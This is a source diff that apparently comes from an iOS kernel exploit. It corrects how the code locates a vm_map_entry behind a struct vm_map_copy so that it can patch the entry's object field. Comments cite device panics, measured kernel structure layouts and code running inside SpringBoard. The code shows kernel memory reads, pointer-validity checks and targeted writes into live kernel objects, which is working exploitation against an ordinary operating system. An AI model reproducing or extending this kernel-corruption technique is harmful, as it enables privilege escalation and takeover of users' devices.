@@ -23,8 +23,15 @@
 
 // Size of a "VM map copies" zone element, as reported by the kernel's own
 // bound check in the 2026-09-26 10:39 panic: "object ... of size 72".
-// Nothing may be written past nextAddr + 0x48.
+// That 72-byte object is a struct vm_map_copy, NOT a vm_map_entry. We only
+// READ VME_ENTRY_ZONE_BYTES from it (for the DIAG dump). Nothing is written
+// into it any more -- see nextAddr below.
 #define VME_ENTRY_ZONE_BYTES 0x48u
+
+// offsetof(struct vm_map_copy, c_u.hdr.links.next), i.e. XNU's own
+// vm_map_copy_first_entry() macro. The single real backing entry is reached
+// through this pointer, not by treating the copy itself as the entry.
+#define VME_COPY_FIRST_ENTRY 0x20u
 
 // The only 32-byte block offset that both contains vme_object_or_delta and
 // stays inside a 0x48 element: [0x20, 0x40) <= 0x48.
@@ -273,9 +280,39 @@ static struct VMShmem vm_create_shmem_with_object_locked(struct VMObject *object
     // happened to hold. Measured on device 2026-09-26 10:30 (commit eaf46c86):
     // strlen() executed inside SpringBoard returned 0 three times per attempt,
     // and sb_via_bounce came back 0x0 / 0x3 / 0x4233627577576168 ("hAwUb3B").
-    uint64_t nextAddr = shmemVMCopyAddr;
+    // The object at shmemVMCopyAddr is a struct vm_map_copy, NOT a
+    // struct vm_map_entry. Its layout, measured with the compiler against
+    // Apple open-source tag xnu-10063.121.3 and confirmed byte-for-byte
+    // against 7 device samples on 2026-09-26 11:25 (commit ce1d3b38):
+    //
+    //   +0x00 u16 type          = 0x0001 = VM_MAP_COPY_ENTRY_LIST   [seen]
+    //   +0x08 u64 offset                                                 [seen 0]
+    //   +0x10 u64 size          = 0x4000, a 16 KB named entry        [seen]
+    //   +0x18    c_u.hdr.links.prev   -> first entry (nentries == 1) [varies]
+    //   +0x20    c_u.hdr.links.next   -> vm_map_copy_first_entry()  [varies]
+    //   +0x28    c_u.hdr.links.start                             [seen 0]
+    //   +0x30    c_u.hdr.links.end                               [seen 0]
+    //   +0x38 int nentries      = 1                                  [seen 1]
+    //   +0x3c u16 page_shift    = 0x000e -> 1 << 14 == 0x4000        [seen]
+    //   +0x40    c_u.hdr.rb_head_store = 0xBAADC0D1 = SKIP_RB_TREE   [seen]
+    //
+    // 0xBAADC0D1 is a named XNU constant (osfmk/vm/vm_map_store.h:126),
+    // not allocator poison. Seeing it pinned at +0x40 is what identified the
+    // whole object as a vm_map_copy.
+    //
+    // The 7 device samples also proved 0x3c is a CONSTANT 0x0001000e across
+    // every entry while +0x18/+0x20 changed per entry, i.e. we were writing
+    // 4 bytes into cpy_hdr.page_shift -- a live header field -- and calling
+    // it MATCH. Hence strlen() kept returning 0 with no crash.
+    //
+    // The entry to patch is therefore the one the copy points at:
+    //     nextAddr = kread64(shmemVMCopyAddr + 0x20)
+    // which is XNU's own vm_map_copy_first_entry() macro. offsetof(entry,
+    // vme_object_or_delta) stays 0x3c, but it is now applied to the entry
+    // and no longer to the copy.
+    uint64_t nextAddr = kread64(shmemVMCopyAddr + VME_COPY_FIRST_ENTRY);
     if (!is_kaddr_valid(nextAddr)) {
-        printf("[DS][%s:%d] backing vm_map_copy invalid 0x%llx\n", __FUNCTION__, __LINE__,
+        printf("[DS][%s:%d] vm_map_copy_first_entry invalid 0x%llx\n", __FUNCTION__, __LINE__,
                (unsigned long long)nextAddr);
         mach_vm_deallocate(mach_task_self(), localAddr, PAGE_SIZE);
         if (MACH_PORT_VALID(memoryObject)) mach_port_deallocate(mach_task_self_, memoryObject);
@@ -283,7 +320,10 @@ static struct VMShmem vm_create_shmem_with_object_locked(struct VMObject *object
     }
 
     // -------------------------------------------------------------------------
-    // The "VM map copies" zone element at nextAddr is 72 (0x48) bytes.
+    // The 0x48-byte "VM map copies" element is the vm_map_copy at
+    // shmemVMCopyAddr; nextAddr is the separate vm_map_entry it points at.
+    // The historical panic quoted below is why writes are limited to one
+    // 32-byte block, and it is still the right bound to respect.
     //
     // Proof from the device (panic 2026-09-26 10:39, incident B668A9A9,
     // xnu-10063.122.3 on iPhone13,2 / 21F90):
@@ -336,7 +376,8 @@ static struct VMShmem vm_create_shmem_with_object_locked(struct VMObject *object
             hexbuf[i * 2 + 1] = hexdig[raw[i] & 0xF];
         }
         hexbuf[VME_ENTRY_ZONE_BYTES * 2] = '\0';
-        NSLog(@"[DS] DIAG vmmapcopy nextAddr=0x%llx elemBytes=0x%lx sizeof(vm_map_entry)=0x%lx raw=%s",
+        NSLog(@"[DS] DIAG vmmapcopy copy=0x%llx entry=0x%llx copyBytes=0x%lx sizeof(vm_map_entry)=0x%lx raw=%s",
+              (unsigned long long)shmemVMCopyAddr,
               (unsigned long long)nextAddr,
               (unsigned long)VME_ENTRY_ZONE_BYTES,
               (unsigned long)sizeof(struct vm_map_entry),
